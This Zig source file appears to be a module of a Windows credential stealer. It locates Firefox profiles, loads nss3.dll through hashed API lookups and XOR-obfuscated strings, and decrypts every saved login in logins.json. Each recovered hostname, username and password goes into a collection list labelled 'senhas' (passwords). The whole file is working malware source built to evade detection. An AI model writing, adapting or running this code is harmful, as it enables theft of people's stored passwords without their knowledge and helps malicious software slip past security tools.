const std = @import("std");
const coleta = @import("coleta.zig");
const winfs = @import("winfs.zig");
const obf = @import("obf.zig");
const furtivo = @import("furtivo.zig");

// NSS SECItem structure (matches C ABI on x86_64-windows)
const SECItem = extern struct {
    type: u32 = 0,
    data: [*]u8 = undefined,
    len: u32 = 0,
};

const PK11SDR_DecryptFn = *const fn (*SECItem, *SECItem, ?*anyopaque) callconv(.c) c_int;
const SECItemFreeFn = *const fn (*SECItem, c_int) callconv(.c) void;

// Parse profiles.ini to find Firefox profile directories
fn findFirefoxProfiles(allocator: std.mem.Allocator, app_data: []const u8) ![][]u8 {
    const ini_path = std.fs.path.join(allocator, &[_][]const u8{ app_data, "Mozilla", "Firefox", "profiles.ini" }) catch return error.PathError;
    defer allocator.free(ini_path);

    if (!winfs.pathExists(ini_path)) return error.FileNotFound;

    const content = winfs.readFileAlloc(allocator, ini_path, 1024 * 1024) catch return error.ReadError;
    defer allocator.free(content);

    var profiles = std.ArrayList([]u8).empty;

    var lines = std.mem.splitScalar(u8, content, '\n');
    var in_profile_section = false;
    var is_relative: bool = true;
    var profile_path: ?[]u8 = null;

    while (lines.next()) |line| {
        const trimmed = std.mem.trim(u8, line, " \r\t");

        if (trimmed.len > 0 and trimmed[0] == '[') {
            // Save previous profile if we have one
            if (profile_path) |pp| {
                const full_path = if (is_relative)
                    std.fs.path.join(allocator, &[_][]const u8{ app_data, "Mozilla", "Firefox", pp }) catch null
                else
                    allocator.dupe(u8, pp) catch null;
                if (full_path) |fp| {
                    profiles.append(allocator, fp) catch {};
                }
                allocator.free(pp);
                profile_path = null;
            }

            in_profile_section = std.mem.startsWith(u8, trimmed, "[Profile");
            is_relative = true;
        } else if (in_profile_section) {
            if (std.mem.startsWith(u8, trimmed, "IsRelative=")) {
                is_relative = trimmed[11] == '1';
            } else if (std.mem.startsWith(u8, trimmed, "Path=")) {
                if (profile_path) |pp| allocator.free(pp);
                profile_path = allocator.dupe(u8, trimmed[5..]) catch null;
            }
        }
    }

    // Don't forget the last profile
    if (profile_path) |pp| {
        const full_path = if (is_relative)
            std.fs.path.join(allocator, &[_][]const u8{ app_data, "Mozilla", "Firefox", pp }) catch null
        else
            allocator.dupe(u8, pp) catch null;
        if (full_path) |fp| {
            profiles.append(allocator, fp) catch {};
        }
        allocator.free(pp);
    }

    return profiles.toOwnedSlice(allocator);
}

fn decryptNSSItem(allocator: std.mem.Allocator, b64_data: []const u8, decrypt_fn: PK11SDR_DecryptFn, free_fn: ?SECItemFreeFn) ?[]u8 {
    // Base64-decode the encrypted data
    const decoder = std.base64.standard.Decoder;
    const decoded_len = decoder.calcSizeForSlice(b64_data) catch return null;
    const decoded = allocator.alloc(u8, decoded_len) catch return null;
    defer allocator.free(decoded);
    decoder.decode(decoded, b64_data) catch return null;

    // Create SECItem for input
    var input_item = SECItem{
        .type = 0,
        .data = decoded.ptr,
        .len = @intCast(decoded.len),
    };

    // Create SECItem for output
    var output_item = SECItem{
        .type = 0,
        .data = undefined,
        .len = 0,
    };

    if (decrypt_fn(&input_item, &output_item, null) != 0) return null;
    // Free the NSS-allocated buffer once we have our copy.
    defer if (free_fn) |f| f(&output_item, 0);
    if (output_item.len == 0) return null;

    return allocator.dupe(u8, output_item.data[0..output_item.len]) catch null;
}

pub fn firefox(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);

    // Find Firefox profiles
    const profiles = findFirefoxProfiles(allocator, app_data) catch return;
    defer {
        for (profiles) |p| allocator.free(p);
        allocator.free(profiles);
    }

    if (profiles.len == 0) return;

    // Get kernel32 for LoadLibraryA
    const k32 = furtivo.getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    if (k32 == 0) return;

    // Try to find nss3.dll already loaded, otherwise load it
    var nss3 = furtivo.getModuleHandle(&comptime obf.xorStr("nss3.dll"));

    if (nss3 == 0) {
        const loadlib_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("LoadLibraryA")) catch return;
        if (loadlib_addr == 0) return;
        const LoadLibraryA = @as(*const fn ([*:0]const u8) callconv(.winapi) usize, @ptrFromInt(loadlib_addr));

        const nss3_name = obf.dexor(allocator, &comptime obf.xorStr("nss3.dll")) catch return;
        defer allocator.free(nss3_name);
        const nss3_name_z = allocator.dupeZ(u8, nss3_name) catch return;
        defer allocator.free(nss3_name_z);

        nss3 = LoadLibraryA(nss3_name_z.ptr);
        if (nss3 == 0) return;
    }

    // Resolve NSS function pointers
    const nss_init_addr = obf.getProcAddressByHash(nss3, comptime obf.apiHash("NSS_Init")) catch return;
    if (nss_init_addr == 0) return;
    const NSS_Init = @as(*const fn ([*:0]const u8) callconv(.c) c_int, @ptrFromInt(nss_init_addr));

    const get_slot_addr = obf.getProcAddressByHash(nss3, comptime obf.apiHash("PK11_GetInternalKeySlot")) catch return;
    if (get_slot_addr == 0) return;
    const PK11_GetInternalKeySlot = @as(*const fn () callconv(.c) ?*anyopaque, @ptrFromInt(get_slot_addr));

    const auth_addr = obf.getProcAddressByHash(nss3, comptime obf.apiHash("PK11_Authenticate")) catch return;
    if (auth_addr == 0) return;
    const PK11_Authenticate = @as(*const fn (?*anyopaque, c_int, ?*anyopaque) callconv(.c) c_int, @ptrFromInt(auth_addr));

    const sdr_decrypt_addr = obf.getProcAddressByHash(nss3, comptime obf.apiHash("PK11SDR_Decrypt")) catch return;
    if (sdr_decrypt_addr == 0) return;
    const PK11SDR_Decrypt = @as(PK11SDR_DecryptFn, @ptrFromInt(sdr_decrypt_addr));

    const free_item_addr = obf.getProcAddressByHash(nss3, comptime obf.apiHash("SECITEM_FreeItem")) catch 0;
    const SECITEM_FreeItem: ?SECItemFreeFn = if (free_item_addr != 0) @ptrFromInt(free_item_addr) else null;

    const shutdown_addr = obf.getProcAddressByHash(nss3, comptime obf.apiHash("NSS_Shutdown")) catch 0;
    const NSS_Shutdown: ?*const fn () callconv(.c) void = if (shutdown_addr != 0)
        @ptrFromInt(shutdown_addr)
    else
        null;

    for (profiles) |profile_path| {
        if (!winfs.pathExists(profile_path)) continue;

        // Read logins.json
        const logins_path = std.fs.path.join(allocator, &[_][]const u8{ profile_path, "logins.json" }) catch continue;
        defer allocator.free(logins_path);

        if (!winfs.pathExists(logins_path)) continue;

        const content = winfs.readFileAlloc(allocator, logins_path, 10 * 1024 * 1024) catch continue;
        defer allocator.free(content);

        // Parse JSON
        const parsed = std.json.parseFromSlice(std.json.Value, allocator, content, .{}) catch continue;
        defer parsed.deinit();

        const root = parsed.value.object;
        const logins_val = root.get("logins") orelse continue;
        const logins_arr = logins_val.array;

        // Initialize NSS with this profile
        const profile_path_z = allocator.dupeZ(u8, profile_path) catch continue;
        defer allocator.free(profile_path_z);

        if (NSS_Init(profile_path_z.ptr) != 0) continue;

        const slot = PK11_GetInternalKeySlot();
        if (slot == null) {
            if (NSS_Shutdown) |shutdown| shutdown();
            continue;
        }

        if (PK11_Authenticate(slot, 0, null) != 0) {
            if (NSS_Shutdown) |shutdown| shutdown();
            continue;
        }

        for (logins_arr.items) |login_val| {
            const login = login_val.object;

            const hostname_val = login.get("hostname") orelse continue;
            const hostname = hostname_val.string;

            const enc_user_val = login.get("encryptedUsername") orelse continue;
            const enc_user_b64 = enc_user_val.string;

            const enc_pass_val = login.get("encryptedPassword") orelse continue;
            const enc_pass_b64 = enc_pass_val.string;

            // Decrypt username
            const user_decrypted = decryptNSSItem(allocator, enc_user_b64, PK11SDR_Decrypt, SECITEM_FreeItem) orelse continue;
            defer allocator.free(user_decrypted);

            // Decrypt password
            const pass_decrypted = decryptNSSItem(allocator, enc_pass_b64, PK11SDR_Decrypt, SECITEM_FreeItem) orelse continue;
            defer allocator.free(pass_decrypted);

            col.senhas.append(allocator, .{
                .url = allocator.dupe(u8, hostname) catch continue,
                .usuario = allocator.dupe(u8, user_decrypted) catch continue,
                .senha = allocator.dupe(u8, pass_decrypted) catch continue,
                .navegador = allocator.dupe(u8, "Firefox") catch continue,
            }) catch continue;
        }

        if (NSS_Shutdown) |shutdown| shutdown();
    }
}
